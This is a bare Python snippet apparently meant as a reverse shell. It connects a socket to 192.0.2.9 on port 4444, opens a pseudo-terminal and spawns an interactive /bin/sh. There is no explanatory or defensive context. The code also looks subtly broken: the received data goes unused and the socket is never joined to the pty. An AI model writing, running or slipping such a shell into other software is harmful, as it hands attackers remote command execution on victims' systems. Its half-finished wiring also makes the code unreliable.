import socket, subprocess, pty
sock = socket.socket()
sock.connect(('192.0.2.9', 4444))
command = sock.recv(4096)
master, slave = pty.openpty()
subprocess.Popen(['/bin/sh', '-i'], stdin=slave, stdout=slave, stderr=slave)
